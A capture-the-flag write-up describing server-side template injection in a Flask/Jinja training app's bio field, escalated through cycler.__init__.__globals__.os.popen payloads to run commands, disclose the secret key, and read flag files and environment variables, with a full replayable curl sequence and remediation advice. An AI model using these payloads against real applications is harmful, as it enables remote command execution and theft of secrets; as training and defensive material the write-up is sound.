# ThryveCTF Web Certification — Detailed Write-up

## Scope

Target assessed:

```text
http://0f6d161d-bcc0-4f2e-b835-5e5979416cea.inst.thryvectf.org
```

This write-up documents the authorized CTF activity performed against the supplied training target. Disposable accounts were created during testing. Rotating CSRF tokens, session cookies, and disposable passwords are shown as placeholders in the replay commands.

## Result

The application was vulnerable to server-side template injection (SSTI) in the candidate bio field. The injection could access Python globals and execute operating-system commands.

The flag was recovered from the `DYN_FLAG` environment variable and the flag files:

```text
Thryve{e0ea294f-06f9-4d6a-8c8a-1956e71d3494}
```

## Application structure observed

```text
Client
  |
  v
nginx
  |
  v
Flask application using Jinja templates
  |-- /                 Landing page
  |-- /register         Candidate registration
  |-- /login            Authentication
  |-- /dashboard        Candidate portal
  |-- /quiz             Assessment
  |-- /certificate      Certificate rendering
  |-- /logout           Session termination
  `-- /static/*         CSS assets
```

Observed characteristics:

- The `Server` header identified nginx.
- Flask configuration was available to the template as `config`.
- Sessions used a signed `session` cookie.
- Forms used CSRF tokens.
- The `is_premium=true` cookie was appended to assessment requests.
- The bio was stored and later evaluated while rendering `/certificate`.
- The response set a restrictive CSP, including `script-src 'none'`; this did not prevent server-side template execution.
- The exact database implementation was not determined remotely.

## 1. Reconnaissance

The landing page was fetched first:

```bash
curl -i --max-time 15 http://0f6d161d-bcc0-4f2e-b835-5e5979416cea.inst.thryvectf.org/
```

The page exposed `/register` and `/login` and described a candidate assessment workflow.

## 2. Registration and CSRF handling

The registration form was fetched while saving cookies:

```bash
curl -sS -i --max-time 15 \
  -c /tmp/inetrix-cookies.txt \
  http://0f6d161d-bcc0-4f2e-b835-5e5979416cea.inst.thryvectf.org/register
```

The form contained fields named `username`, `bio`, `password`, `password_confirm`, and `csrf_token`. The CSRF token was copied from the form for the POST request.

## 3. Basic SSTI confirmation

The first bio used this harmless arithmetic expression:

```jinja2
SSTI probe: {{7*7}}
```

The registration POST had this form:

```bash
curl -sS -i --max-time 15 \
  -b /tmp/inetrix-cookies.txt \
  -c /tmp/inetrix-cookies.txt \
  -X POST \
  http://0f6d161d-bcc0-4f2e-b835-5e5979416cea.inst.thryvectf.org/register \
  --data-urlencode 'csrf_token=[REGISTER_CSRF]' \
  --data-urlencode 'username=ctf_candidate_[DATE]' \
  --data-urlencode 'bio=SSTI probe: {{7*7}}' \
  --data-urlencode 'password=[DISPOSABLE_PASSWORD]' \
  --data-urlencode 'password_confirm=[DISPOSABLE_PASSWORD]'
```

After logging in and completing the quiz, the certificate showed:

```text
SSTI probe: 49
```

That confirmed that the bio was being interpreted as a Jinja-style template rather than displayed only as literal text.

## 4. Authentication and assessment access

The login form was retrieved:

```bash
curl -sS -i --max-time 15 \
  -b /tmp/inetrix-cookies.txt \
  -c /tmp/inetrix-cookies.txt \
  http://0f6d161d-bcc0-4f2e-b835-5e5979416cea.inst.thryvectf.org/login
```

The login POST used the form's CSRF token:

```bash
curl -sS -i --max-time 15 \
  -b /tmp/inetrix-cookies.txt \
  -c /tmp/inetrix-cookies.txt \
  -X POST \
  http://0f6d161d-bcc0-4f2e-b835-5e5979416cea.inst.thryvectf.org/login \
  --data-urlencode 'csrf_token=[LOGIN_CSRF]' \
  --data-urlencode 'username=[DISPOSABLE_USERNAME]' \
  --data-urlencode 'password=[DISPOSABLE_PASSWORD]'
```

The dashboard and quiz were requested with the premium cookie appended:

```bash
curl -sS -i --max-time 15 \
  -b /tmp/inetrix-cookies.txt \
  -b 'is_premium=true' \
  http://0f6d161d-bcc0-4f2e-b835-5e5979416cea.inst.thryvectf.org/dashboard

curl -sS -i --max-time 15 \
  -b /tmp/inetrix-cookies.txt \
  -b 'is_premium=true' \
  -c /tmp/inetrix-cookies.txt \
  http://0f6d161d-bcc0-4f2e-b835-5e5979416cea.inst.thryvectf.org/quiz
```

The three correct quiz values were:

```text
q1=https
q2=rate_limit
q3=find_issues
```

The assessment was submitted with:

```bash
curl -sS -i --max-time 15 \
  -b /tmp/inetrix-cookies.txt \
  -b 'is_premium=true' \
  -c /tmp/inetrix-cookies.txt \
  -X POST \
  http://0f6d161d-bcc0-4f2e-b835-5e5979416cea.inst.thryvectf.org/quiz \
  --data-urlencode 'csrf_token=[QUIZ_CSRF]' \
  --data-urlencode 'q1=https' \
  --data-urlencode 'q2=rate_limit' \
  --data-urlencode 'q3=find_issues'
```

The resulting certificate was fetched with:

```bash
curl -sS -i --max-time 15 \
  -b /tmp/inetrix-cookies.txt \
  -b 'is_premium=true' \
  http://0f6d161d-bcc0-4f2e-b835-5e5979416cea.inst.thryvectf.org/certificate
```

## 5. Configuration disclosure

The next bio was:

```jinja2
{{config}}
```

The certificate rendered Flask configuration, including:

```text
DEBUG: False
SERVER_NAME: None
APPLICATION_ROOT: /
SESSION_COOKIE_NAME: session
PREFERRED_URL_SCHEME: http
SECRET_KEY: dev-change-me-please
```

The configuration probe did not contain the flag, but it confirmed that Flask/Jinja objects were exposed in the template context.

## 6. Escalating SSTI to command execution

The following payload accessed Python's `os` module through a Jinja object:

```jinja2
{{ cycler.__init__.__globals__.os.popen('pwd').read() }}
```

The certificate bio returned:

```text
/app
```

This proved server-side command execution.

The next payload listed the application directory:

```jinja2
{{ cycler.__init__.__globals__.os.popen('ls -la /app').read() }}
```

Relevant output:

```text
/app/app.py
/app/data/
/app/templates/
/app/static/
/app/Dockerfile
/app/docker-compose.yml
/app/app.py.bak-dynflag-20260814082453
/app/Dockerfile.bak-dynflag-20260814082453
```

## 7. Locating the flag

A targeted search was executed through the bio:

```jinja2
{{ cycler.__init__.__globals__.os.popen("find /app -type f -iname '*flag*' -print; grep -RniE 'flag|dynflag' /app --exclude='*.pyc' 2>/dev/null | head -80").read() }}
```

The output revealed:

```text
/app/app.py.bak-dynflag-20260814082453
/app/Dockerfile.bak-dynflag-20260814082453
/app/app.py:28:FLAG_PATH = os.path.join(RUNTIME_DIR, "flag.txt")
/app/app.py:29:INSTANCE_FLAG = os.environ.get("DYN_FLAG") or os.environ.get("FLAG", "Thryve{instance_not_ready}")
/app/app.py:34:for path in (FLAG_PATH, "/tmp/flag.txt"):
/app/Dockerfile:14:RUN ln -sf /tmp/flag.txt /flag.txt
```

This identified both the environment variable and the flag file locations.

## 8. Reading the flag

The final payload read the environment variable and the known file paths:

```jinja2
{{ cycler.__init__.__globals__.os.popen("printf 'DYN_FLAG='; printenv DYN_FLAG; printf ' FILES='; cat /tmp/flag.txt /flag.txt /app/flag.txt /app/data/flag.txt 2>/dev/null").read() }}
```

The certificate rendered:

```text
DYN_FLAG=Thryve{e0ea294f-06f9-4d6a-8c8a-1956e71d3494}
FILES=Thryve{e0ea294f-06f9-4d6a-8c8a-1956e71d3494}
Thryve{e0ea294f-06f9-4d6a-8c8a-1956e71d3494}
```

Therefore the flag was:

```text
Thryve{e0ea294f-06f9-4d6a-8c8a-1956e71d3494}
```

## Why the payload uses Python

The vulnerable application is Flask-based, and Flask normally uses Jinja templates. Jinja executes expressions inside `{{ ... }}` on the server before the HTTP response reaches the browser.

The payload works in stages:

```text
cycler
  -> __init__
  -> __globals__
  -> os
  -> popen(command)
  -> read()
```

`cycler` is a Jinja-provided object. Its initializer exposes Python global names, including the imported `os` module. `os.popen()` starts a server-side process and `.read()` captures the command output so it can be inserted into the certificate bio.

This is not JavaScript execution. The command runs in the Python process hosting the application.

## Why not JavaScript?

JavaScript would not be the right mechanism for this vulnerability:

1. The injection point is evaluated by the server's Jinja/Python template engine.
2. Browser JavaScript executes only after the server has generated the response.
3. Browser JavaScript cannot normally read `/app`, `/tmp/flag.txt`, Python environment variables, or server processes.
4. The application sent `Content-Security-Policy: script-src 'none'`, which blocks inline and external browser scripts.
5. The problem is server-side template injection, not client-side XSS.

JavaScript could be relevant to a separate client-side vulnerability, but it would not provide the server filesystem access needed here.

## Complete command sequence used

The following is the complete sequence of shell command forms used during the assessment. Repeated account workflows were used because the bio was fixed at registration time. `[CSRF]` values were copied from the immediately preceding form response.

### Initial access and first SSTI

```bash
curl -i --max-time 15 http://0f6d161d-bcc0-4f2e-b835-5e5979416cea.inst.thryvectf.org/
curl -sS -i --max-time 15 -c /tmp/inetrix-cookies.txt http://0f6d161d-bcc0-4f2e-b835-5e5979416cea.inst.thryvectf.org/register
curl -sS -i --max-time 15 -b /tmp/inetrix-cookies.txt -c /tmp/inetrix-cookies.txt -X POST http://0f6d161d-bcc0-4f2e-b835-5e5979416cea.inst.thryvectf.org/register --data-urlencode 'csrf_token=[CSRF]' --data-urlencode 'username=[USER]' --data-urlencode 'bio=SSTI probe: {{7*7}}' --data-urlencode 'password=[PASSWORD]' --data-urlencode 'password_confirm=[PASSWORD]'
curl -sS -i --max-time 15 -b /tmp/inetrix-cookies.txt -c /tmp/inetrix-cookies.txt http://0f6d161d-bcc0-4f2e-b835-5e5979416cea.inst.thryvectf.org/login
curl -sS -i --max-time 15 -b /tmp/inetrix-cookies.txt -c /tmp/inetrix-cookies.txt -X POST http://0f6d161d-bcc0-4f2e-b835-5e5979416cea.inst.thryvectf.org/login --data-urlencode 'csrf_token=[CSRF]' --data-urlencode 'username=[USER]' --data-urlencode 'password=[PASSWORD]'
curl -sS -i --max-time 15 -b /tmp/inetrix-cookies.txt -b 'is_premium=true' http://0f6d161d-bcc0-4f2e-b835-5e5979416cea.inst.thryvectf.org/dashboard
curl -sS -i --max-time 15 -b /tmp/inetrix-cookies.txt -b 'is_premium=true' http://0f6d161d-bcc0-4f2e-b835-5e5979416cea.inst.thryvectf.org/quiz
curl -sS -i --max-time 15 -b /tmp/inetrix-cookies.txt -b 'is_premium=true' -c /tmp/inetrix-cookies.txt -X POST http://0f6d161d-bcc0-4f2e-b835-5e5979416cea.inst.thryvectf.org/quiz --data-urlencode 'csrf_token=[CSRF]' --data-urlencode 'q1=https' --data-urlencode 'q2=rate_limit' --data-urlencode 'q3=find_issues'
curl -sS -i --max-time 15 -b /tmp/inetrix-cookies.txt -b 'is_premium=true' http://0f6d161d-bcc0-4f2e-b835-5e5979416cea.inst.thryvectf.org/certificate
```

### Configuration probe

The same register/login/quiz/certificate sequence was repeated with this bio:

```jinja2
{{config}}
```

### `pwd` probe

The same sequence was repeated with:

```jinja2
{{ cycler.__init__.__globals__.os.popen('pwd').read() }}
```

### `/app` listing probe

The same sequence was repeated with:

```jinja2
{{ cycler.__init__.__globals__.os.popen('ls -la /app').read() }}
```

### Flag-reference search probe

The same sequence was repeated with:

```jinja2
{{ cycler.__init__.__globals__.os.popen("find /app -type f -iname '*flag*' -print; grep -RniE 'flag|dynflag' /app --exclude='*.pyc' 2>/dev/null | head -80").read() }}
```

### Final flag-read probe

The same sequence was repeated with:

```jinja2
{{ cycler.__init__.__globals__.os.popen("printf 'DYN_FLAG='; printenv DYN_FLAG; printf ' FILES='; cat /tmp/flag.txt /flag.txt /app/flag.txt /app/data/flag.txt 2>/dev/null").read() }}
```

## Remediation

The core fix is to treat the bio as data, never as a template:

- Render it with normal escaped template interpolation.
- Do not pass user input to `render_template_string()` or an equivalent dynamic-template API.
- Use a strict allowlist of template variables and remove unnecessary objects from the Jinja context.
- Do not expose `config`, Python globals, or imported modules to untrusted template content.
- Keep secrets out of locations reachable by the application process where possible.
- Run the application as a non-root user with a read-only filesystem and minimal permissions.
- Rotate the exposed Flask secret key and any challenge/application credentials.
- Keep CSRF protection enabled, but recognize that CSRF does not stop SSTI after an authenticated request.
- Add regression tests using inputs such as `{{7*7}}` and assert that they render literally.

The CSP was useful against browser-side script injection, but it could not mitigate SSTI because the vulnerable evaluation happened before the response was sent.
